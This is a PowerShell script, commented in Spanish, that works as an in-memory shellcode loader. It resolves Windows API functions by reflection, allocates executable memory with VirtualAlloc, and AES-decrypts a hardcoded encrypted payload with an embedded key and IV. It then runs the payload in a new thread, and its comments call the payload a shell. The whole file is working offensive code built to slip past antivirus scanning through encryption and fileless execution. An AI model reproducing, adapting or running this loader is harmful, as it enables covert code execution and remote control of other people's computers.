function LookupFunc {
    Param (
        $moduleName, 
        $functionName
    )
    # Obtiene la referencia a los metodos nativos inseguros en la libreria de ensamblados del dominio actual
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    
    # Inicializa un arreglo temporal para almacenar el metodo GetProcAddress
    $tmp = @()
    
    # Busca el metodo GetProcAddress y lo almacena en el arreglo temporal
    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
    
    # Invoca el metodo GetProcAddress para obtener la direccion de la funcion especificada
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    
    # Crea un ensamblado dinamico y define el modulo y tipo para el delegado
    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    
    # Configura el constructor para el delegado
    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
    
    # Configura el metodo Invoke que ejecutara el delegado
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
    
    # Crea y retorna el tipo de delegado
    return $type.CreateType()
}

function Decrypt-Bytes($Bytes, $Key, $IV) {
    # Crea un objeto para descifrado AES
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
    
    # Configura el tama√±o de clave y bloque en 128 bits
    $aes.KeySize = 128
    $aes.BlockSize = 128

    # Define el modo de relleno como ceros
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros

    # Asigna la clave y el vector de inicializacion (IV)
    $aes.key = $Key
    $aes.IV = $IV

    # Crea un descifrador y descifra los datos
    $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)
    $decrypted = $decryptor.TransformFinalBlock($Bytes, 0, $Bytes.Length) 
    
    # Libera los recursos del objeto AES
    $aes.Dispose()
    return $decrypted
}

# Asigna un buffer de memoria utilizando VirtualAlloc
$memoriaAsignada = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Definicion de la carga util cifrada (payload)
[Byte[]]$CargaUtilCifrada =
0x94,0x50,0x21,0x4c,0x93,0x74,0x1d,0x40,0xa5,0x8f,0xb3,0xd0,0xa4,0x8d,0x37,
0x5a,0x1a,0xf5,0x5f,0x02,0x58,0x71,0x2e,0x35,0x1d,0x5c,0x71,0x9a,0x50,0x7f,
0xf8,0x1f,0xca,0xe9,0xe8,0x07,0x17,0x8c,0x0c,0x4c,0xac,0x88,0xce,0xfb,0x39,
0x65,0xf0,0x07,0xbf,0x3c,0xe5,0x88,0x44,0x97,0x81,0x1c,0x62,0x90,0xf1,0x53,
0x1a,0xb7,0x26,0x60,0x1f,0x75,0x91,0x60,0xa9,0xc0,0x7f,0x44,0x22,0xef,0x22,
0x92,0x35,0xff,0x3e,0x29,0x55,0x86,0xf6,0x02,0x5c,0xef,0x39,0x1d,0xf0,0xdb,
0x65,0x68,0xfe,0xf6,0x3d,0x30,0x30,0xc5,0x74,0xc1,0x15,0xe5,0xb4,0x69,0x92,
0x63,0x76,0xe2,0xde,0x32,0xd6,0x0e,0xfb,0xba,0x59,0xb3,0x3f,0x04,0x30,0xde,
0x8f,0xb6,0x8c,0xa2,0x8e,0x96,0x14,0x77,0xd4,0x9a,0x66,0xec,0xb1,0x4e,0x1e,
0x63,0x70,0x30,0xca,0x97,0xcf,0x25,0xda,0x2a,0x0b,0x8d,0xcc,0xf0,0xcf,0xde,
0xea,0xdb,0x09,0x1c,0x61,0xd4,0x86,0x60,0xaa,0x6b,0x10,0x2b,0x13,0x7d,0x2e,
0x82,0x8b,0x1d,0x04,0x55,0x6f,0xcd,0x11,0x7f,0x7b,0x25,0x05,0xe8,0x97,0xa9,
0x5d,0x87,0x19,0xde,0xd2,0x03,0xe9,0x89,0x58,0x37,0xec,0x42,0xee,0x67,0x4e,
0x02,0x6b,0x97,0xdf,0xae,0x19,0x70,0xaf,0x5a,0x22,0x99,0x5d,0xbc,0xe7,0x65,
0x5c,0x5b,0x8e,0x47,0xa2,0x4f,0x22,0xdf,0x0f,0xdb,0x20,0xac,0x29,0xb9,0x91,
0x8b,0xd7,0x40,0xc1,0xf4,0x86,0xc6,0x72,0x81,0xad,0x8f,0x38,0x1b,0x96,0xd7,
0xa4,0x10,0x1b,0xd7,0xbc,0xf3,0x38,0x18,0x22,0x91,0x66,0x37,0x31,0xa4,0x88,
0x88,0x4c,0x22,0xe0,0xd7,0x2b,0x92,0x7d,0x38,0x88,0x97,0xdc,0x0d,0xde,0x7e,
0x71,0xfb,0x88,0x5b,0x7c,0xf2,0xed,0xf3,0x85,0x99,0x3b,0x62,0xa0,0x95,0x22,
0x6e,0x68,0x84,0x2d,0x37,0x69,0x51,0x84,0x3b,0x50,0xaf,0x0a,0xc7,0x86,0xf3,
0x4f,0x8f,0xec,0x6c,0x8d,0x3d,0xda,0x54,0x1e,0x1b,0xaf,0x83,0xf7,0x83,0x18,
0x0a,0x88,0x55,0xa8,0x26,0xb1,0x36,0x86,0xff,0x11,0x4d,0x0c,0x64,0xc4,0xf1,
0x14,0xa2,0x25,0xa0,0x98,0x78,0xc8,0x1f,0x08,0x82,0xd8,0x85,0x78,0xe6,0x77,
0x71,0xdb,0x25,0x90,0x49,0xba,0xda,0x9f,0x47,0x5e,0x3b,0xd3,0x58,0xec,0x69,
0x67,0xf3,0x54,0x16,0xef,0x2a,0xcd,0x0d,0xc2,0xc9,0x81,0xfa,0x86,0x66,0x9a,
0x76,0xc1,0xf5,0xe0,0x4f,0x9b,0x06,0xd9,0x4d,0x96,0x14,0x42,0xb1,0x62,0xa4,
0xdb,0xb1,0xe7,0x81,0xe8,0xde,0xa8,0xb7,0xd7,0x7d,0xb3,0x67,0x32,0xd7,0x4b,
0x01,0xb8,0x0c,0x26,0xfe,0x0a,0x6e,0xd4,0x13,0xaa,0x50,0x38,0xc5,0x54,0xd0,
0x76,0x52,0x27,0xfc,0x5c,0x5b,0x7c,0x11,0x8e,0xc9,0xe8,0x96,0x74,0x94,0x19,
0x84,0x56,0x77,0x34,0xb9,0x6a,0x09,0x9f,0x81,0xe0,0xc6,0xab,0x6d,0x8b,0x61,
0xa3,0x45,0x76,0x98,0xbf,0x61,0xbb,0x66,0xf7,0xb0,0x22,0x3e,0x01,0x5f,0x6b,
0xf3,0xf0,0xde,0x77,0x14,0x12,0x86,0x0f,0x86,0x8e,0xd6,0x50,0xb1,0x14,0x82,
0x67,0x8f,0x40,0x7b,0x9a,0xea,0x44,0xcd,0x84,0xb7,0xde,0x1d,0xb6,0xa1,0xdb,
0xd1,0x2a,0xac,0xc2,0x0c,0x41,0xa5,0xef,0x42,0x60,0x7c,0x78,0xdb,0xf5,0x1a,
0xec,0x55,0x67,0x50,0x11,0x17,0x16,0x6d,0x35,0x8e,0x8f,0xb3,0x0f,0x9d,0x4f,
0x89,0xda,0xe4,0x41,0x8a,0xef,0x32,0xc8,0xfe,0xf9,0xf6,0x1a,0xfb,0x36,0x56,
0xae,0xe1,0x96,0xd7,0xc7,0x94,0xcc,0x22,0x08,0x72,0x50,0xa2,0x66,0xaa,0x2d,
0x84,0xe5,0x63,0x63,0xba,0x9a,0x86,0xf5,0x56,0xde,0x33,0x3c,0x53,0xbd,0xd9,
0xae,0xc4,0x12,0x25,0x2d,0x7c,0x19,0xea,0x3c,0x93,0xc5,0x08,0x39,0xba,0x3c,
0xc2,0x4c,0x40,0xb8,0x5b,0x36,0x5b,0x96,0x8c,0x50,0x5e,0x02,0x25,0x10,0xb3,
0x6f,0x82,0x21,0x51,0xa8,0x4a,0x87,0x4d,0x1a,0x03,0x0d,0xf0,0x7e,0x6e,0xa4,
0x2e,0xb9,0x3d,0x71,0x13,0x49,0xfd,0xb0,0xdd,0xe2,0x58,0x29,0xe4,0x13,0xd7,
0xeb,0xed,0xb4,0x4b,0x99,0xb5,0xd3,0xff,0x2b,0x5c,0x57,0x8d,0xe2,0x15,0x38,
0x1d,0x48,0xde,0xf9,0x64,0x49,0xe7,0x7f,0x3e,0x99,0x55

# Definicion de la clave para el cifrado
[Byte[]]$ClaveAES =
0xd2,0x26,0xc8,0xa6,0x6d,0x3e,0xf8,0x0d,0xfc,0x5c,0x8c,0xf5,0x5c,0xfe,0x48,
0xea,0xf0,0x22,0x96,0xd2,0xae,0x60,0x7a,0x0f,0x22,0xde,0x67,0xe8,0x46,0xe4,
0x51,0x91

# Definicion del vector de inicializacion (IV)
[Byte[]]$VectorInicializacion =
0x4f,0x9e,0x31,0x0b,0xf6,0x35,0x9a,0x9d,0xdc,0x84,0xc2,0xc6,0x9c,0x69,0xd1,
0xb2

# Descifrar la carga util utilizando la clave y el IV
$bufferDescifrado = Decrypt-Bytes -Bytes $cargaUtilCifrada -Key $ClaveAES -IV $VectorInicializacion

# Copiar el codigo de la carga util descifrada en el buffer de memoria
[System.Runtime.InteropServices.Marshal]::Copy($bufferDescifrado, 0, $memoriaAsignada, $bufferDescifrado.length)

# Crear un hilo de ejecucion usando las instrucciones en la direccion de memoria de la carga util
$hiloEjecucion = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $memoriaAsignada, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Ejecuta el hilo y espera hasta que el hilo finalice para cerrar la shell
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hiloEjecucion, 0xFFFFFFFF)
